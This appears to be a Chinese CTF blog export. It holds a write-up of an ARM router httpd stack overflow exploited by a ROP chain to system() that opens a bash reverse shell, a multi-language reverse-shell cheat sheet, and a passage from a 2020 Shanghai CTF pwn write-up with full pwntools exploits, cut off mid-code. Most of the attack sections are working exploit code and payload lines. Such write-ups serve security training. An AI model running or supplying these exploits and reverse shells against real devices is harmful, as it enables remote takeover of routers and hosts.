./pwn/httpd\n\n启动log\n┌[logan☮arch]-(~/share/nu1l/babyroute/docker)└&gt; sudo ./start.sh [sudo] password for logan: init_core_dump 1816: rlim_cur = -1, rlim_max = -1init_core_dump 1825: open core dump successinit_core_dump 1834: rlim_cur = 5242880, rlim_max = 5242880Yes:      ****** WeLoveLinux******  Welcome to ...connect: No such file or directoryConnect to server failed.connect: No such file or directoryConnect to server failed.connect: No such file or directoryConnect to server failed.connect: No such file or directoryConnect to server failed.create socket  fail -1connect: No such file or directoryConnect to server failed.connect: No such file or directoryConnect to server failed.connect: No such file or directoryConnect to server failed.connect: No such file or directoryConnect to server failed.[httpd][debug]----------------------------webs.c,157httpd listen ip = 10.10.10.10 port = 80webs: Listening for HTTP requests at address 10.10.10.10\n\n\n\n启动后gdb远程调试\ngdb-multiarch\n\n设置 架构为arm\n远程调试端口为1234\npwndbg&gt; set architecture armThe target architecture is set to &quot;arm&quot;.pwndbg&gt; target remote 127.0.0.1:1234Remote debugging using 127.0.0.1:1234\n\n在漏洞函数0xC2FD4处下短点\npwndbg&gt; b *0xC2FD4Breakpoint 1 at 0xc2fd4\n\n\n\nexp#! /usr/bin/python3import requestsurl = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;p = &#x27;A&#x27; * 0x1000d = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ &#x27;A&#x27; * 0x1000&#125;r = requests.post(url, d)print(r.text)\n\n\n\nlog输出如下\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; python poc&#123;&quot;errCode&quot;:2&#125;\n\n发现不能运行到我们的位置，进行再调试调试看看是那块没有绕过。重新下断电在formSetMacFilterCfg函数，偏移为: 000BCB9C\n发现能够调用到formSetMacFilterCfg函数，但没法继续调用下一个函数，再来分析分析还有什么条件没有绕过。\n  0xbd3a0    sub    r3, fp, #0x24  0xbd3a4    ldr    r2, [pc, #0x36c]  0xbd3a8    add    r2, r4, r2  0xbd3ac    mov    r0, r2  0xbd3b0    mov    r1, r3► 0xbd3b4    bl     #0xf2f8 &lt;0xf2f8&gt;  0xbd3b8    mov    r3, r0  0xbd3bc    cmp    r3, #0  0xbd3c0    beq    #0xbd458 &lt;0xbd458&gt;\n\n执行到GetValue的时候， 会出现http响应错误，然而该函数是调用lib的，只能先分析一下lib。\n通过分析lib中的GetValue函数，会议cookie值检测，需要包含password等字段，内容随便伪造。\npoc如下\n触发poc#! /usr/bin/python3import requestsurl = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;p = &#x27;A&#x27; * 0x1000d = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ &#x27;A&#x27; * 0x1000&#125;r = requests.post(url, cookies = c, data = d)print(r.text)\n\n漏洞触发如下\n*R0   0x0*R1   0x3ffef110 ◂— 0*R2   0x3ff4c020 ◂— stm    r0!, &#123;r5&#125;*R3   0x0*R4   0x41414141 (&#x27;AAAA&#x27;) R5   0x11bf40 ◂— str    r7, [r5, #0x70] /* 0x666f672f; &#x27;/goform/setMacFilterCfg&#x27; */ R6   0x1 R7   0x408007fb ◂— 0x41414141 (&#x27;AAAA&#x27;) R8   0xe968 ◂— stm    r0!, &#123;r0, r2, r3&#125; R9   0x2e128 ◂— ldr    r0, [pc, #0x40] R10  0x40800668 ◂— 0x41414141 (&#x27;AAAA&#x27;)*R11  0x41414141 (&#x27;AAAA&#x27;)*R12  0x3ff47edc —▸ 0x3ff3da50 ◂— adds   r0, #0*SP   0x40800098 ◂— 0x41414141 (&#x27;AAAA&#x27;)*PC   0x41414140 (&#x27;@AAA&#x27;)───────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────Invalid address 0x41414140\n\n这时发现，已经修改了PC寄存器，实现了劫持。\n漏洞利用接下来就计算便宜找system函数了。\n─────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────── R0   0x407fffe4 ◂— 0x0 R1   0x11ee31 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27; R2   0x407fffe4 ◂— 0x0 R3   0x11ee31 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27; R4   0xfab18 —▸ 0xfa9d0 ◂— 1 R5   0x11c0e0 ◂— strbtvs r6, [pc], -pc, lsr #14 /* 0x666f672f; &#x27;/goform/setMacFilterCfg&#x27; */ R6   0x1 R7   0x408007fb ◂— &#x27;./pwn/httpd&#x27; R8   0xe968 ◂— mov    ip, sp R9   0x2e128 ◂— push   &#123;r4, fp, lr&#125; R10  0x40800668 ◂— 0x0 R11  0x407ffe94 —▸ 0xbdb80 ◂— sub    r3, fp, #0x1d0 R12  0xfaf60 —▸ 0x3fdda508 ◂— mov    r3, r0 SP   0x407ffe50 ◂— 0x0*PC   0xbe9a4 ◂— bl     #0xf640──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────   0xbe990    bl     #0xf640 &lt;0xf640&gt;    0xbe994    ldr    r2, [fp, #-0x3c]   0xbe998    ldr    r3, [fp, #-0x10]   0xbe99c    mov    r0, r2   0xbe9a0    mov    r1, r3 ► 0xbe9a4    bl     #0xf640 &lt;0xf640&gt;\n\n\n\n\n\n65:0194│ r0    0x407fffe4 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27;... ↓74:01d0│       0x40800020 ◂— &#x27;BBBBCCCC&#x27;75:01d4│       0x40800024 ◂— &#x27;CCCC&#x27;76:01d8│ r3-1  0x40800028 ◂— 0x0... ↓8d:0234│       0x40800084 ◂— 0x1f8e:0238│       0x40800088 —▸ 0xf0bc8 ◂— ldmdbvs r6!, &#123;r2, r5, r6, r8, sl, sp, lr&#125; ^ /* &#x27;deviceList&#x27; */\n\n堆栈数据如上，由于是如下进行弹堆栈的，需要再填充(0x238 - 0x1d4)个字节才可以修爱pc寄存器，实现劫持。\n.text:000BE9AC                 MOV             R0, R3.text:000BE9B0                 SUB             SP, R11, #8.text:000BE9B4                 LDMFD           SP!, &#123;R4,R11,PC&#125;\n\n\n\n\n\n重新修改poc\n#! /usr/bin/python3import requestsurl = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;p = &#x27;A&#x27; * 0xA8p += &#x27;DDDD&#x27;p += &#x27;EEEE&#x27;p += &#x27;FFFF&#x27;d = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ p&#125;r = requests.post(url, cookies = c, data = d)\n\n运行如下，那么就可以知道在哪可以实现修改pc寄存器了。\n*R11  0x45454545 (&#x27;EEEE&#x27;)*R12  0x3ff47edc —▸ 0x3ff3da50 ◂— mov    r3, r0*SP   0x40800098 ◂— &#x27;GGGGHHHH&#x27;*PC   0x46464646 (&#x27;FFFF&#x27;)──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────Invalid address 0x46464646\n\n由于程序没有开启alsr与pie那么glibc中的基址是固定的。\n直接算获取system地址。vmmap获取glibc基址为0xf659b000\n在libc中找到system函数偏移\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; readelf -s docker/pwn/lib/libc.so.0  | grep system   433: 0005a270   348 FUNC    WEAK   DEFAULT    7 system   904: 00047b38    80 FUNC    GLOBAL DEFAULT    7 svcerr_systemerr  1394: 0005a270   348 FUNC    GLOBAL DEFAULT    7 __libc_syste\n\n\n\n\n\n这里记得检查下CPSR寄存器的T位，因为栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。如果T位值为1，需要在地址上加一还原。\npwndbg&gt; p/t $cpsr$1 = 1100000000000000000000000010000pwndbg&gt; cyclic -l taab176\n\n\n\n寻找gadgetsgadget1\n用于修改r3寄存器\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; ROPgadget --binary docker/pwn/lib/libc.so.0 --only &quot;pop&quot; | grep r3...0x00018298 : pop &#123;r3, pc&#125;...\n\n\n\ngadget2\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; ROPgadget --binary ./docker/pwn/lib/libc.so.0  | grep &quot;mov r0, sp ; blx r3&quot;...0x00040cb8 : mov r0, sp ; blx r3...\n\n\n\npayload结构为[offset, gadget1, system_addr, gadget2, cmd] \n先将system函数地址储存在r3寄存器中，执行到gadget2将sp的值赋给r0，也就是将sp作为system的参数，而这时sp指向的是cmd。\npoc#! /usr/bin/python3import requestsfrom pwn import *url = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;libc_base = 0xf659b000system  = libc_base + 0x0005a270gadget1 = libc_base + 0x00018298gadget2 = libc_base + 0x00040cb8cmd = b&#x27;touch test\\x00&#x27;p = b&#x27;A&#x27; * 0xA8p += b&#x27;DDDD&#x27;p += b&#x27;EEEE&#x27;p += p32(gadget1)p += p32(system)p += p32(gadget2)p += cmdd = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ p&#125;r = requests.post(url, cookies = c, data = d)print(r.text)\n\n修改url 为docker所转发的端口，现在试试在docker上是否已经创建test文件\nroot@a52d03d064d3:/# lsbin   dev  flag  lib    media  opt   pwn   run   srv       sys   tmp  varboot  etc  home  lib64  mnt    proc  root  sbin  start.sh  test  usr\n\n可以看到已经创建了test文件。\n那么如何实现交互呢?就采用bash下来反弹sehll 吧。\n先在自己的服务器上使用nc来监听。\nnc -lvnp 4444\n\n在poc中的命令填写为\nbash -i &gt;&amp; /dev/tcp/192.168.43.13/4444 0&gt;&amp;1\n\n192.168.43.13是我物理机的ip,4444是我nc监听的端口。\n现在poc为\n#! /usr/bin/python3import requestsfrom pwn import *url = &quot;http://127.0.0.1:2333/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;libc_base = 0xf659b000system  = libc_base + 0x0005a270gadget1 = libc_base + 0x00018298gadget2 = libc_base + 0x00040cb8cmd = b&#x27;bash -i &gt;&amp; /dev/tcp/192.168.43.13/4444 0&gt;&amp;1&#x27;p = b&#x27;A&#x27; * 0xA8p += b&#x27;DDDD&#x27;p += b&#x27;EEEE&#x27;p += p32(gadget1)p += p32(system)p += p32(gadget2)p += cmdd = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ p&#125;r = requests.post(url, cookies = c, data = d)print(r.text)\n\n\n\n\n\n反弹shell大全在服务器上开启监听：\nnc -lvnp 4444nc -vvlp 4444\n\n目标机器开启反弹\nbash版本：\nbash -i &gt;&amp; /dev/tcp/your_server_ip/port 0&gt;&amp;1\n\nperl版本：\nperl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;\n\nphp版本：\nphp -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;\n\nruby版本：\nruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;\n\npython版本：\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\nnc版本：\nnc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999\n\njava版本：\nr = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()\n\nlua版本：\nlua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;\n\nNC版本不使用-e参数：\nmknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1 mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe\n\n参考: \nhttps://www.anquanke.com/post/id/204403\nhttps://www.jb51.net/article/118423.htm\n","categories":["security"],"tags":["cve"]},{"title":"第六届上海大学生网络安全大赛 Pwn WP","url":"/2020/11/13/security/ctf/compitation/wp-shanghai-syber-2020/","content":"第六届上海大学生网络安全大赛这次比赛干了一天，早餐只吃了点鸡蛋， 午饭没吃， 干完pwn后才去吃的饭，总之今天表现的还不错，pwn给over了，cpu-emulator还拿了三血。。。\n比赛开始了半个小时后，我就直接看pwn去了，发现签到题还没做，与我组队的师傅们好像刚好去打线下赛去了，我的队伍第9，而咱们实验室的另一只队伍与第一并其，这次比赛只筛选一只队伍，我们队就去不了了，总之下次好好加油吧，冲进线下！！！\n最终排名如下:\n\npwn1 [cpu_emulator]这个题拿了三血，刚开始一直没找到漏洞点，不断的分析才知道有个功能堆偏移地址写入。\n简单概述程序pie没开，是一个指令模拟器，实现某些运算操作。输入时先开辟内存储存指令数据，但是没有堆相关的漏洞。\n程序运行规则:\n输入指令后，进入run函数进行运行，每次取出 dword的数据进行解析指令，以下解释是根据调试出来的，这个ida反编译有误，然而在执行sub_4009A8函数时是取出操作指令数据，也就是26~32位，ida反编译时没有相关的变量来储存这个操作指令，通过调试才发现的。然后就是取出3个被操作数了\nresult = (unsigned int)nbytes &gt;&gt; 2;    if ( src_pos &gt;= (unsigned int)result )      return result;    now_src = get_src();    if ( (unsigned int)sub_4009A8(now_src) )    // 获取操作指令, 26 ~ 32    &#123;      v6 = sub_400971(now_src, 5, 21);          // 21位后5bit      v7 = sub_400971(now_src, 5, 16);          // 16位后5bit      v8 = sub_400971(now_src, 16, 0);          // 0位后16bit      result = (unsigned __int64)off_401404;      switch ( (unsigned int)&amp;savedregs )      &#123;        case 1u:          return result;        case 4u:          result = dword_6020E0[v7];          if ( dword_6020E0[v6] == (_DWORD)result )          &#123;            v4 = 4 * v8 + 4;            result = (unsigned int)(v4 + src_pos);            src_pos += v4;          &#125;          return result;        case 8u:          dword_6020E0[v7] = dword_6020E0[v6] + v8;          continue;        case 9u:          dword_6020E0[v7] = dword_6020E0[v6] - v8;          break;        case 0xAu:          dword_6020E0[v7] = v8 &gt; (signed int)dword_6020E0[v6];          break;        case 0xCu:          dword_6020E0[v7] = v8 &amp; dword_6020E0[v6];          break;        case 0xDu:          dword_6020E0[v7] = v8 | dword_6020E0[v6];          break;        case 0xEu:          dword_6020E0[v7] = v8 ^ dword_6020E0[v6];          break;        case 0xFu:          dword_6020E0[v7] = v8 &lt;&lt; 16;          break;        case 0x23u:          dword_6020E0[v7] = *(unsigned __int8 *)(qword_602168 + (signed int)(dword_6020E0[v6] + v8));          break;        case 0x2Bu:          *(_BYTE *)(qword_602168 + (signed int)(dword_6020E0[v6] + v8)) = dword_6020E0[v7];// vul          break;        default:          continue;      &#125;\n\n漏洞点在操作指令为0x2b的地方，而qword_602168储存的是堆buf的地址，从这里可以看到，通过v6与v8还有v7的配合可以实现向堆中写入单个字节的数据。\n思路通过以上漏洞修改， heap中tcache struct 0x68位置的地址为atoi函数的got地址，更具atoi与system函数的偏移爆破system函数地址，在调用atoi函数时传入’&#x2F;bin&#x2F;sh\\x00’即可。\n实现步骤:\n先将dword_6020E0[0]来储存qword_602168中堆地址到tcache struct 0x68位置的偏移，采用9指令实现负数偏移，8指令来实现我们目标地址的分开但字节储存，也就是atoi函数的got地址，2b指令来实现单字节写入控制好被操作数即可一次写入。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;123.56.52.128&quot;server_port = 18236# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(sz, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(sz))\tsa(&#x27;:&#x27;, d)def run():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)def q():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tc = &#x27;&#x27;&#x27;\tmov rax, 1\tsyscall\t&#x27;&#x27;&#x27;\tp = asm(c, arch = &#x27;amd64&#x27;)\tp = p32(0xafffffff)\t# dword_6020E0[v7] = dword_6020E0[v6] + v8;\t#\t\t       o    *    *                *\t#p = p32(0b00100000111110001000100010001000)\t# qword_602168 -&gt; heap chunk 2\t# size 0x10011\tlibc = ELF(&#x27;./libc.so.6&#x27;)\tli(&#x27;libc_atoi  : &#x27; + hex(libc.sym[&#x27;atoi&#x27;]))\tli(&#x27;libc_system: &#x27; + hex(libc.sym[&#x27;system&#x27;]))\t\t&#x27;&#x27;&#x27;\t0x6020e0[0] = offset of heap\t0x6020e0[1] = our target address\t0x6020e0[2] = 0\t&#x27;&#x27;&#x27;\tp = &#x27;A&#x27; *0x60\tad(0x60, p)\t# offset - 0x1e8\t# 0x1009070:      0x0000000000000000      0x0000000001019270\t#\t\t       o    *    *               *\tp = p32(0b00100100000000000000000111101000) # 9 target offset\t# set out addrs pointer to got\t# atoi: 0x602058\t#\t\t       o    *    *               *\tp +=p32(0b00100000001000010000000001011000) # 9  0x58\tp +=p32(0b00100000010000100000000000100000) # 9  0x20\tp +=p32(0b00100000011000110000000001100000) # 9  0x60\t# 16 bit point to our value\t#\t\t       o    *    *               *\tp +=p32(0b10101100000000010000000000000000) # 2b\tp +=p32(0b10101100000000100000000000000001) # 2b\tp +=p32(0b10101100000000110000000000000010) # 2b\tp +=p32(0b10101100000001000000000000000011) # set as null\tad(len(p), p)\trun()\t# modify atoi as system\t# system offset: 0x4f550\tad(0x60, &#x27;\\x50\\xf5&#x27;)\tdb()\tsl(&#x27;/bin/sh\\x00&#x27;)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tfor _ in range(256):\t\ttry:\t\t\tif LOCAL:\t\t\t\telf = ELF(elf_path)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\t\t\telse:\t\t\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\t\t\t\t\telse:\t\t\t\telf = ELF(elf_path)\t\t\t\tio = remote(server_ip, server_port)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\texploit()\t\t\tfinish()\t\texcept:\t\t\tcontinue\n\n\n\n\n\npwn2 [lgtwo]概述.一个典型的菜单堆题。这个题有点坑，pie没开，本来采用unlink打入堆指针数组的，发现got表不能写入。。。远程没法打unlink，操蛋。\n程序没给libc，需要自己使用相关技巧来实现获取远程libc版本。\n采用手法，故意unlink失败。\ndef exploit():        li(&#x27;exploit...&#x27;)        ad(0x458, &#x27;A&#x27;) # 0        ad(0x68, &#x27;A&#x27;)  # 1        ad(0x68, &#x27;A&#x27;)  # 2        ad(0x458, &#x27;A&#x27;) # 3        rm(0)        md(2, b&#x27;A&#x27; * 0x60 + p64(0x70 + 0x70 + 0x470) + b&#x27;\\x70&#x27;)        rm(3)\n\n输出如下\n[DEBUG] Received 0x1b2 bytes:    b&quot;*** Error in `./pwn&#x27;: double free or corruption (!prev): 0x00000000017a0550 ***\\n&quot;    b&#x27;======= Backtrace: =========\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f7eed9487f5]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7f7eed95138a]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f7eed95558c]\\n&#x27;    b&#x27;./pwn[0x400a8c]\\n&#x27;    b&#x27;./pwn[0x400cfa]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f7eed8f1840]\\n&#x27;    b&#x27;./pwn[0x400739]\\n&#x27;    b&#x27;======= Memory map: ========\\n&#x27;*** Error in `./pwn&#x27;: double free or corruption (!prev): 0x00000000017a0550 ***======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f7eed9487f5]/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7f7eed95138a]/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f7eed95558c]./pwn[0x400a8c]./pwn[0x400cfa]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f7eed8f1840]./pwn[0x400739]======= Memory map: ========[*] Got EOF while reading in interactive\n\n可以得到__libc_start_main的地址了，在线libc searcher查询，即可获得libc版本。\n查找到libc为: libc6_2.23-0ubuntu11.2_amd64\nvul在添加函数中，存在off by one漏洞\nunsigned __int64 add()&#123;  bool v0; // al  unsigned int v1; // eax  int v3; // [rsp+10h] [rbp-30h]  int i; // [rsp+14h] [rbp-2Ch]  int v5; // [rsp+18h] [rbp-28h]  int v6; // [rsp+1Ch] [rbp-24h]  int v7; // [rsp+20h] [rbp-20h]  int v8; // [rsp+24h] [rbp-1Ch]  int v9; // [rsp+28h] [rbp-18h]  int v10; // [rsp+2Ch] [rbp-14h]  int v11; // [rsp+30h] [rbp-10h]  int v12; // [rsp+34h] [rbp-Ch]  unsigned __int64 v13; // [rsp+38h] [rbp-8h]  v13 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 15 &amp;&amp; p_addr[i]; ++i )    ;  if ( i == 16 )  &#123;    puts(&quot;full!&quot;);  &#125;  else  &#123;    puts(&quot;size?&quot;);    _isoc99_scanf((__int64)&quot;%d&quot;, (__int64)&amp;v3);    if ( v3 &gt;= 0 &amp;&amp; v3 &lt;= 4096 )    &#123;      v5 = 100;      v6 = 200;      p_addr[i] = malloc(v3);      p_size[i] = v3;      puts(&quot;content?&quot;);      read(0, &amp;unk_6021C0, 0x20uLL);      v7 = 1;      v8 = v5 + v6;      v9 = v6;      if ( v5 + v6 &lt;= v5 )        v0 = v6 != 0;      else        v0 = v5 != 0;      if ( v0 )      &#123;        v10 = v5;        v11 = v6;        v12 = v5;      &#125;      else      &#123;        v6 = 1;      &#125;      v6 = v5;      v1 = p_size[i];      p_size[i] = v1 + 1;                       // vul      sub_400806(v1);    &#125;    else    &#123;      puts(&quot;invalid size&quot;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v13;&#125;\n\n\n\n思路先释放0x71大小的chunk构造fastbin attack 链，采用house of einherjar实现堆重叠，将main_arena地址挤到0x71 fastbin fd地方，parital write修改fastbin fd为_IO_2_1_stderr_ + 157处，开辟0x71的内存到_IO_2_1_stdout_修改此结构体泄漏_IO_2_1_stderr_+192处的地址，计算得到libc基址。\n再次使用fastbin attack 打入__malloc_hook - 0x23处，修改__realloc_hook为one_gadget，__malloc_hook为realloc，realloc来进行调整execve第二个参数。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;123.56.52.128&quot;server_port = 45830# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(sz, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;?&#x27;, str(sz))\tsa(&#x27;?&#x27;, d)def rm(i):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(i))def dp(i):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)\tsla(&#x27;?&#x27;, str(i))def md(i, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)\tsla(&#x27;?&#x27;, str(i))\tsa(&#x27;?&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(0x80, &#x27;A&#x27;)  # 0\tad(0x68, &#x27;A&#x27;)  # 1\tad(0x68, &#x27;A&#x27;)  # 2\tad(0x88, &#x27;A&#x27;)  # 3\tad(0x68, &#x27;A&#x27;)  # 4\tlib = ELF(&#x27;./libc.so.6&#x27;)\tli(&#x27;lib stdout + 157:&#x27; + hex(lib.sym[&#x27;_IO_2_1_stderr_&#x27;] + 157))\t\trm(0)\tp = b&#x27;A&#x27; * 0x60\tp += p64(0x70 + 0x70 + 0x90)\tp += b&#x27;\\x90&#x27;\tmd(2, p)\trm(1)\trm(3) # house of einharjar\tad(0x80, &#x27;A&#x27;) # 0\trm(0)\tad(0xa0, &#x27;A&#x27;) #0\tp = b&#x27;A&#x27; * 0x80\tp += p64(0) + p64(0x71)\tp += b&#x27;\\xdd\\x55&#x27;\tmd(0, p)\tad(0x68, &#x27;B&#x27;) # 1\tad(0x68, &#x27;B&#x27;) # 3\tp = b&#x27;\\x00&#x27; * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0)\tmd(3, p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - 